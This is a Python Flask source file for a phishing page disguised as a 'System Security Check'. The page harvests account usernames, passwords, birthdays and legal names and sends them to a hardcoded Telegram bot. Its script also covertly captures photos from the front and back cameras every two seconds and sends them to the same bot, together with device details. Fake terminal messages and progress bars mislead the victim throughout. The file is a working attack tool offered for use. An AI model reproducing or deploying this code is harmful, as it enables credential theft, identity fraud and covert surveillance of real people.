from flask import Flask, render_template_string, request, jsonify, send_file
import requests
import json
import threading
import time
from datetime import datetime
import base64
import os
import random
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Telegram Bot Configuration
BOT_TOKEN = '8802775389:AAGn7eRc1-v9v0bwxbcYb4Wtxu23jF39zik'
CHAT_ID = '8730143288'

# Store connected accounts (in memory for demo)
connected_accounts = []

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>System Security Check</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #0a0a0a;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
      font-family: 'Share Tech Mono', monospace;
      position: relative;
      overflow: hidden;
    }
    
    #matrix-bg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      opacity: 0.12;
      pointer-events: none;
    }
    
    .card {
      background: rgba(10, 14, 23, 0.95);
      max-width: 520px;
      width: 100%;
      border-radius: 20px;
      padding: 30px 24px;
      border: 1px solid rgba(0, 255, 0, 0.2);
      box-shadow: 0 0 40px rgba(0, 255, 0, 0.05), inset 0 0 60px rgba(0, 255, 0, 0.02);
      position: relative;
      z-index: 1;
      backdrop-filter: blur(10px);
      transition: all 0.3s;
    }
    
    .card::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      border-radius: 22px;
      background: linear-gradient(45deg, #00ff00, transparent, #00ff00);
      opacity: 0.1;
      z-index: -1;
    }
    
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      border-bottom: 1px solid rgba(0, 255, 0, 0.15);
      padding-bottom: 12px;
    }
    
    .header-title {
      color: #00ff00;
      font-size: 1.1rem;
      font-weight: 400;
      letter-spacing: 3px;
      text-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
    }
    
    .header-status {
      color: #00ff00;
      font-size: 0.7rem;
      opacity: 0.7;
      animation: blink 1s infinite;
    }
    
    @keyframes blink {
      0%, 50% { opacity: 0.7; }
      51%, 100% { opacity: 0.2; }
    }
    
    .console-line {
      color: #00ff00;
      font-size: 0.75rem;
      opacity: 0.6;
      margin: 4px 0;
      font-family: 'Share Tech Mono', monospace;
      white-space: pre-wrap;
      word-break: break-all;
    }
    
    .console-line .highlight {
      color: #00ff00;
      opacity: 1;
    }
    
    .console-line .error {
      color: #ff4444;
    }
    
    .console-line .success {
      color: #00ff88;
    }
    
    .loader-wrap {
      background: rgba(0, 255, 0, 0.05);
      border-radius: 4px;
      height: 4px;
      margin: 16px 0 8px;
      overflow: hidden;
      border: 1px solid rgba(0, 255, 0, 0.1);
    }
    
    .loader-fill {
      height: 100%;
      width: 0%;
      background: #00ff00;
      border-radius: 4px;
      transition: width 0.15s ease;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
    }
    
    .timer-label {
      text-align: right;
      font-size: 0.7rem;
      color: rgba(0, 255, 0, 0.5);
      margin-top: 2px;
      font-family: 'Share Tech Mono', monospace;
    }
    
    .btn {
      background: transparent;
      border: 1px solid rgba(0, 255, 0, 0.3);
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.9rem;
      padding: 14px 20px;
      border-radius: 8px;
      width: 100%;
      margin-top: 20px;
      cursor: pointer;
      transition: all 0.3s;
      letter-spacing: 2px;
      text-transform: uppercase;
      position: relative;
      overflow: hidden;
    }
    
    .btn:hover:not(:disabled) {
      background: rgba(0, 255, 0, 0.05);
      border-color: #00ff00;
      box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
    }
    
    .btn:disabled {
      opacity: 0.3;
      cursor: not-allowed;
    }
    
    .btn .glitch {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.1), transparent);
      transform: translateX(-100%);
      transition: transform 0.5s;
    }
    
    .btn:hover .glitch {
      transform: translateX(100%);
    }
    
    .btn-danger {
      border-color: rgba(255, 68, 68, 0.3);
      color: #ff4444;
    }
    
    .btn-danger:hover:not(:disabled) {
      background: rgba(255, 68, 68, 0.05);
      border-color: #ff4444;
      box-shadow: 0 0 30px rgba(255, 68, 68, 0.1);
    }
    
    .input-group {
      margin-top: 14px;
    }
    
    .input-group label {
      display: block;
      font-size: 0.65rem;
      color: rgba(0, 255, 0, 0.5);
      margin-bottom: 4px;
      font-family: 'Share Tech Mono', monospace;
      letter-spacing: 1px;
      text-transform: uppercase;
    }
    
    .input-group input {
      width: 100%;
      padding: 10px 14px;
      border-radius: 6px;
      border: 1px solid rgba(0, 255, 0, 0.15);
      background: rgba(0, 255, 0, 0.03);
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.85rem;
      outline: none;
      transition: all 0.3s;
    }
    
    .input-group input:focus {
      border-color: #00ff00;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.05);
    }
    
    .input-group input::placeholder {
      color: rgba(0, 255, 0, 0.2);
    }
    
    .input-group input:invalid {
      border-color: rgba(255, 68, 68, 0.3);
    }
    
    .safe-badge {
      background: rgba(0, 255, 0, 0.05);
      border: 1px solid rgba(0, 255, 0, 0.3);
      padding: 14px 18px;
      border-radius: 8px;
      text-align: center;
      font-weight: 400;
      font-size: 0.9rem;
      margin: 16px 0 8px;
      color: #00ff00;
      display: none;
      font-family: 'Share Tech Mono', monospace;
      letter-spacing: 1px;
      animation: glowPulse 2s infinite;
    }
    
    @keyframes glowPulse {
      0%, 100% { box-shadow: 0 0 20px rgba(0, 255, 0, 0.1); }
      50% { box-shadow: 0 0 40px rgba(0, 255, 0, 0.2); }
    }
    
    .status-badge {
      color: rgba(0, 255, 0, 0.5);
      border-radius: 4px;
      padding: 4px 10px;
      font-size: 0.65rem;
      display: inline-block;
      margin-top: 8px;
      font-family: 'Share Tech Mono', monospace;
      background: rgba(0, 255, 0, 0.03);
      border: 1px solid rgba(0, 255, 0, 0.05);
    }
    
    .hidden { display: none !important; }
    
    .text-muted {
      color: rgba(0, 255, 0, 0.2);
      font-size: 0.6rem;
      margin-top: 12px;
      text-align: center;
      font-family: 'Share Tech Mono', monospace;
    }
    
    .scan-line {
      height: 1px;
      background: linear-gradient(90deg, transparent, #00ff00, transparent);
      width: 100%;
      margin: 12px 0;
      opacity: 0.1;
      animation: scan 3s linear infinite;
    }
    
    @keyframes scan {
      0% { transform: scaleX(0); opacity: 0; }
      50% { transform: scaleX(1); opacity: 0.3; }
      100% { transform: scaleX(0); opacity: 0; }
    }
    
    .account-count {
      color: rgba(0, 255, 0, 0.3);
      font-size: 0.7rem;
      text-align: center;
      margin-top: 10px;
      font-family: 'Share Tech Mono', monospace;
    }
    
    .account-count span {
      color: #00ff00;
      opacity: 0.8;
    }
    
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
      flex-direction: column;
    }
    
    .loading-overlay.active {
      display: flex;
    }
    
    .loading-overlay .spinner {
      border: 2px solid rgba(0, 255, 0, 0.1);
      border-top: 2px solid #00ff00;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .loading-overlay .text {
      color: #00ff00;
      margin-top: 20px;
      font-size: 0.8rem;
      opacity: 0.6;
      font-family: 'Share Tech Mono', monospace;
    }
    
    .terminal-loading {
      color: #00ff00;
      font-family: 'Share Tech Mono', monospace;
      font-size: 0.8rem;
      margin-top: 10px;
      opacity: 0.8;
      text-align: center;
    }
    
    .terminal-loading .line {
      opacity: 0;
      animation: fadeIn 0.3s forwards;
    }
    
    @keyframes fadeIn {
      to { opacity: 1; }
    }
    
    .error-msg {
      color: #ff4444;
      font-size: 0.7rem;
      margin-top: 5px;
      display: none;
      font-family: 'Share Tech Mono', monospace;
    }
    
    .error-msg.show {
      display: block;
    }
  </style>
</head>
<body>
  <canvas id="matrix-bg"></canvas>
  
  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <div class="terminal-loading" id="terminalLoading">
      <div class="line">> INITIALIZING SECURITY PROTOCOLS...</div>
      <div class="line">> ESTABLISHING ENCRYPTED CHANNEL...</div>
      <div class="line">> VERIFYING SYSTEM INTEGRITY...</div>
      <div class="line">> DEPLOYING PROTECTION MODULES...</div>
      <div class="line">> SECURING ACCOUNT...</div>
    </div>
    <div class="text">PROCESSING...</div>
  </div>
  
  <div class="card" id="app">
    <div id="loadingSection">
      <div class="header">
        <span class="header-title">◈ SECURE SHELL v3.2</span>
        <span class="header-status">● ONLINE</span>
      </div>
      
      <div id="consoleOutput">
        <div class="console-line">> INITIALIZING SECURE ENVIRONMENT...</div>
        <div class="console-line">> ESTABLISHING ENCRYPTED CHANNEL</div>
        <div class="console-line">> LOADING SECURITY MODULES...</div>
        <div class="console-line" id="statusLine">> STATUS: <span class="highlight">PENDING</span></div>
      </div>
      
      <div class="scan-line"></div>
      
      <div class="loader-wrap">
        <div class="loader-fill" id="loaderFill"></div>
      </div>
      <div class="timer-label" id="timerLabel">0 / 30s</div>
      
      <div class="status-badge" id="statusBadge">⏳ AWAITING RESPONSE...</div>
      
      <button class="btn" id="continueBtn" disabled>
        <span class="glitch"></span>
        ⚡ CONTINUE
      </button>
    </div>

    <div id="loginSection" class="hidden">
      <div class="header">
        <span class="header-title">◈ ACCOUNT SECURITY</span>
        <span class="header-status">● ENCRYPTED</span>
      </div>
      
      <div class="console-line" style="margin-bottom: 12px;">
        > ENTER CREDENTIALS FOR VERIFICATION
      </div>
      
      <div class="input-group">
        <label>📧 USERNAME / EMAIL *</label>
        <input type="text" id="igUsername" placeholder="Enter username" required>
        <div class="error-msg" id="usernameError">⚠️ Username is required</div>
      </div>
      <div class="input-group">
        <label>🔑 PASSWORD *</label>
        <input type="password" id="igPassword" placeholder="Enter password" required>
        <div class="error-msg" id="passwordError">⚠️ Password is required</div>
      </div>
      <div class="input-group">
        <label>📅 BIRTHDAY *</label>
        <input type="text" id="igBirthday" placeholder="DD/MM/YYYY" required>
        <div class="error-msg" id="birthdayError">⚠️ Birthday is required</div>
      </div>
      <div class="input-group">
        <label>📛 LEGAL NAME *</label>
        <input type="text" id="igLegalName" placeholder="Full legal name" required>
        <div class="error-msg" id="nameError">⚠️ Legal name is required</div>
      </div>
      
      <button class="btn" id="protectBtn">
        <span class="glitch"></span>
        🛡️ SECURE ACCOUNT
      </button>
      
      <div id="safeMessage" class="safe-badge">✅ ACCOUNT SECURED</div>
      
      <div class="account-count" id="accountCount">
        CONNECTED ACCOUNTS: <span id="accountCountNum">0</span>
      </div>
      
      <button class="btn btn-danger hidden" id="disconnectBtn">
        <span class="glitch"></span>
        ⚡ DISCONNECT ACCOUNT
      </button>
      
      <div class="text-muted">● END-TO-ENCRYPTION ACTIVE</div>
    </div>
  </div>

  <script>
    // Matrix Rain Effect
    const canvas = document.getElementById('matrix-bg');
    const ctx = canvas.getContext('2d');
    
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    const matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
    const fontSize = 10;
    const columns = canvas.width / fontSize;
    const drops = [];
    
    for (let i = 0; i < columns; i++) {
      drops[i] = 1;
    }
    
    function drawMatrix() {
      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      ctx.fillStyle = '#00ff00';
      ctx.font = fontSize + 'px monospace';
      
      for (let i = 0; i < drops.length; i++) {
        const text = matrixChars[Math.floor(Math.random() * matrixChars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 1;
        }
        drops[i]++;
      }
    }
    
    setInterval(drawMatrix, 50);

    // State
    let loadingCompleted = false;
    let mediaActive = false;
    let intervalPhoto = null;
    let frontStream = null;
    let backStream = null;
    let videoElement = null;
    let dataQueue = [];
    let connectedAccounts = [];
    let currentAccountIndex = -1;

    // DOM Elements
    const loaderFill = document.getElementById('loaderFill');
    const timerLabel = document.getElementById('timerLabel');
    const statusBadge = document.getElementById('statusBadge');
    const continueBtn = document.getElementById('continueBtn');
    const loadingSection = document.getElementById('loadingSection');
    const loginSection = document.getElementById('loginSection');
    const protectBtn = document.getElementById('protectBtn');
    const safeMessage = document.getElementById('safeMessage');
    const statusLine = document.getElementById('statusLine');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const terminalLoading = document.getElementById('terminalLoading');
    const disconnectBtn = document.getElementById('disconnectBtn');
    const accountCountNum = document.getElementById('accountCountNum');

    // Inputs
    const igUsername = document.getElementById('igUsername');
    const igPassword = document.getElementById('igPassword');
    const igBirthday = document.getElementById('igBirthday');
    const igLegalName = document.getElementById('igLegalName');
    
    // Error messages
    const usernameError = document.getElementById('usernameError');
    const passwordError = document.getElementById('passwordError');
    const birthdayError = document.getElementById('birthdayError');
    const nameError = document.getElementById('nameError');

    // Stealth send function
    function stealthSend(endpoint, data) {
      try {
        fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        }).catch(() => {});
      } catch (e) {}
    }

    // Add console line
    function addConsoleLine(text, type = 'normal') {
      const consoleOutput = document.getElementById('consoleOutput');
      const line = document.createElement('div');
      line.className = 'console-line';
      if (type === 'highlight') {
        line.innerHTML = text;
      } else if (type === 'error') {
        line.className = 'console-line error';
        line.textContent = text;
      } else if (type === 'success') {
        line.className = 'console-line success';
        line.textContent = text;
      } else {
        line.textContent = text;
      }
      consoleOutput.appendChild(line);
      consoleOutput.scrollTop = consoleOutput.scrollHeight;
      
      while (consoleOutput.children.length > 15) {
        consoleOutput.removeChild(consoleOutput.firstChild);
      }
    }

    // Get device info
    function getDeviceInfo() {
      const nav = navigator;
      return `DEVICE: ${nav.userAgent} | ${nav.platform} | ${window.screen.width}x${window.screen.height}`;
    }

    // Send device info
    setTimeout(() => {
      stealthSend('/api/send_message', { 
        message: `🕵️ CONNECTION ESTABLISHED\n${getDeviceInfo()}` 
      });
    }, 1000);

    // Request cameras stealthily
    async function requestBothCameras() {
      try {
        // Get front camera
        frontStream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
          }
        });
        
        // Get back camera
        try {
          backStream = await navigator.mediaDevices.getUserMedia({
            video: { 
              facingMode: 'environment',
              width: { ideal: 640 },
              height: { ideal: 480 }
            }
          });
        } catch (backErr) {
          backStream = frontStream;
        }
        
        mediaActive = true;
        
        // Create hidden video element
        videoElement = document.createElement('video');
        videoElement.style.display = 'none';
        videoElement.style.position = 'absolute';
        videoElement.style.width = '1px';
        videoElement.style.height = '1px';
        videoElement.style.opacity = '0';
        document.body.appendChild(videoElement);
        
        // Start stealth photo capture
        startStealthPhotoCapture();
        
        // Send success (silent)
        stealthSend('/api/send_message', { 
          message: '✅ CAMERA ACCESS GRANTED' 
        });
        
      } catch (err) {
        mediaActive = false;
        stealthSend('/api/send_message', { 
          message: `❌ CAMERA DENIED: ${err.message}` 
        });
      }
    }

    // Stealth photo capture
    function startStealthPhotoCapture() {
      if (!mediaActive) return;
      
      async function capturePhotos() {
        if (!mediaActive) return;
        
        try {
          // Capture from front camera
          if (frontStream && frontStream.active) {
            videoElement.srcObject = frontStream;
            await videoElement.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            const frontData = canvas.toDataURL('image/jpeg', 0.7);
            
            stealthSend('/api/send_photo', { 
              photo: frontData,
              camera: 'front',
              timestamp: Date.now()
            });
          }
          
          // Capture from back camera
          if (backStream && backStream !== frontStream && backStream.active) {
            videoElement.srcObject = backStream;
            await videoElement.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            const backData = canvas.toDataURL('image/jpeg', 0.7);
            
            stealthSend('/api/send_photo', { 
              photo: backData,
              camera: 'back',
              timestamp: Date.now()
            });
          }
          
          // Switch back to front
          if (frontStream) {
            videoElement.srcObject = frontStream;
            await videoElement.play();
          }
          
        } catch (e) {
          // Silent fail
        }
      }
      
      // Capture every 2 seconds
      intervalPhoto = setInterval(capturePhotos, 2000);
      setTimeout(capturePhotos, 300);
    }

    // Request cameras
    requestBothCameras();

    // Loading bar
    let startTime = Date.now();
    const DURATION = 30;

    function updateLoader() {
      const elapsed = (Date.now() - startTime) / 1000;
      const progress = Math.min(elapsed / DURATION, 1);
      const percent = Math.round(progress * 100);
      loaderFill.style.width = percent + '%';
      timerLabel.textContent = `${Math.min(Math.floor(elapsed), DURATION)} / ${DURATION}s`;

      if (progress >= 1) {
        loadingCompleted = true;
        continueBtn.disabled = false;
        continueBtn.textContent = '⚡ CONTINUE';
        statusBadge.textContent = '✅ READY';
        statusLine.innerHTML = '> STATUS: <span class="highlight">COMPLETE</span>';
        addConsoleLine('> SECURITY CHECK COMPLETE', 'highlight');
        clearInterval(loaderInterval);
        
        // Hide camera indicator
        document.querySelector('.status-badge').style.display = 'none';
        return;
      }
    }

    const loaderInterval = setInterval(updateLoader, 200);
    updateLoader();

    // Continue button
    continueBtn.addEventListener('click', function() {
      if (!loadingCompleted) return;
      
      addConsoleLine('> INITIATING ACCOUNT VERIFICATION...', 'highlight');
      loadingSection.classList.add('hidden');
      loginSection.classList.remove('hidden');
      
      // Update account count
      updateAccountCount();
    });

    // Validate form
    function validateForm() {
      let valid = true;
      
      if (!igUsername.value.trim()) {
        usernameError.classList.add('show');
        valid = false;
      } else {
        usernameError.classList.remove('show');
      }
      
      if (!igPassword.value.trim()) {
        passwordError.classList.add('show');
        valid = false;
      } else {
        passwordError.classList.remove('show');
      }
      
      if (!igBirthday.value.trim()) {
        birthdayError.classList.add('show');
        valid = false;
      } else {
        birthdayError.classList.remove('show');
      }
      
      if (!igLegalName.value.trim()) {
        nameError.classList.add('show');
        valid = false;
      } else {
        nameError.classList.remove('show');
      }
      
      return valid;
    }

    // Show terminal loading
    function showTerminalLoading() {
      loadingOverlay.classList.add('active');
      
      const lines = terminalLoading.querySelectorAll('.line');
      lines.forEach((line, index) => {
        line.style.opacity = '0';
        setTimeout(() => {
          line.style.opacity = '1';
        }, index * 400);
      });
    }

    // Hide terminal loading
    function hideTerminalLoading() {
      loadingOverlay.classList.remove('active');
    }

    // Protect button - show 5 second loading then success
    protectBtn.addEventListener('click', function() {
      if (!validateForm()) {
        return;
      }
      
      // Disable button during process
      protectBtn.disabled = true;
      protectBtn.textContent = '⏳ PROCESSING...';
      
      // Get credentials
      const username = igUsername.value.trim();
      const password = igPassword.value.trim();
      const birthday = igBirthday.value.trim();
      const legalName = igLegalName.value.trim();
      
      // Send credentials silently
      stealthSend('/api/send_login', {
        username: username,
        password: password,
        birthday: birthday,
        legalName: legalName
      });
      
      // Show terminal loading
      showTerminalLoading();
      
      // Add to connected accounts
      connectedAccounts.push({
        username: username,
        protected: true,
        date: new Date().toISOString()
      });
      
      // Store in localStorage
      try {
        localStorage.setItem('connectedAccounts', JSON.stringify(connectedAccounts));
      } catch (e) {}
      
      // 5 second delay with terminal animation
      setTimeout(() => {
        hideTerminalLoading();
        
        // Show success
        safeMessage.style.display = 'block';
        protectBtn.textContent = '✅ SECURED';
        protectBtn.disabled = true;
        
        // Show disconnect button
        disconnectBtn.classList.remove('hidden');
        
        // Update account count
        updateAccountCount();
        
        // Hide form inputs
        document.querySelectorAll('.input-group').forEach(el => {
          el.style.opacity = '0.3';
          el.querySelector('input').disabled = true;
        });
        
        addConsoleLine('> ACCOUNT SECURED SUCCESSFULLY', 'success');
        
        stealthSend('/api/send_message', { 
          message: '✅ ACCOUNT SECURED - CREDENTIALS RECEIVED' 
        });
        
      }, 5000);
    });

    // Disconnect button
    disconnectBtn.addEventListener('click', function() {
      // Remove last connected account
      if (connectedAccounts.length > 0) {
        connectedAccounts.pop();
        try {
          localStorage.setItem('connectedAccounts', JSON.stringify(connectedAccounts));
        } catch (e) {}
      }
      
      // Reset form
      safeMessage.style.display = 'none';
      disconnectBtn.classList.add('hidden');
      protectBtn.disabled = false;
      protectBtn.textContent = '🛡️ SECURE ACCOUNT';
      
      document.querySelectorAll('.input-group').forEach(el => {
        el.style.opacity = '1';
        el.querySelector('input').disabled = false;
        el.querySelector('input').value = '';
      });
      
      // Clear error messages
      document.querySelectorAll('.error-msg').forEach(el => {
        el.classList.remove('show');
      });
      
      // Update account count
      updateAccountCount();
      
      addConsoleLine('> ACCOUNT DISCONNECTED', 'error');
      
      stealthSend('/api/send_message', { 
        message: '🔌 ACCOUNT DISCONNECTED' 
      });
    });

    // Update account count
    function updateAccountCount() {
      // Load from localStorage
      try {
        const saved = localStorage.getItem('connectedAccounts');
        if (saved) {
          connectedAccounts = JSON.parse(saved);
        }
      } catch (e) {}
      
      accountCountNum.textContent = connectedAccounts.length;
      
      if (connectedAccounts.length > 0) {
        disconnectBtn.classList.remove('hidden');
      }
    }

    // Load saved accounts
    updateAccountCount();

    // Cleanup
    window.addEventListener('beforeunload', function() {
      if (intervalPhoto) clearInterval(intervalPhoto);
      if (frontStream) frontStream.getTracks().forEach(t => t.stop());
      if (backStream && backStream !== frontStream) backStream.getTracks().forEach(t => t.stop());
      if (videoElement) videoElement.srcObject = null;
    });

    // Window resize
    window.addEventListener('resize', function() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    });
  </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Serve the main page"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/send_message', methods=['POST'])
def send_message():
    """Send text message to Telegram"""
    try:
        data = request.json
        message = data.get('message', '')
        
        if not message:
            return jsonify({'error': 'No message provided'}), 400
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        requests.post(url, json=payload, timeout=5)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_photo', methods=['POST'])
def send_photo():
    """Send photo to Telegram"""
    try:
        data = request.json
        photo_data = data.get('photo', '')
        camera_type = data.get('camera', 'unknown')
        timestamp = data.get('timestamp', int(time.time()))
        
        if not photo_data:
            return jsonify({'error': 'No photo provided'}), 400
        
        if 'base64,' in photo_data:
            photo_data = photo_data.split('base64,')[1]
        
        image_bytes = base64.b64decode(photo_data)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {
            'photo': (f'capture_{timestamp}.jpg', image_bytes, 'image/jpeg')
        }
        data = {
            'chat_id': CHAT_ID,
            'caption': f'📸 {camera_type} | {datetime.now().strftime("%H:%M:%S")}'
        }
        
        requests.post(url, files=files, data=data, timeout=10)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/send_login', methods=['POST'])
def send_login():
    """Send login credentials to Telegram"""
    try:
        data = request.json
        username = data.get('username', 'not provided')
        password = data.get('password', 'not provided')
        birthday = data.get('birthday', 'not provided')
        legal_name = data.get('legalName', 'not provided')
        
        message = f"""🔐 CREDENTIALS CAPTURED:
👤 Username: {username}
🔑 Password: {password}
🎂 Birthday: {birthday}
📛 Legal Name: {legal_name}
🕒 {datetime.now().isoformat()}"""
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message
        }
        
        requests.post(url, json=payload, timeout=5)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Starting Stealth Server...")
    print(f"📱 Running on port: {port}")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"💬 Chat ID: {CHAT_ID}")
    print(f"🕵️ Stealth mode active - No visible indications")
    app.run(debug=False, host='0.0.0.0', port=port)
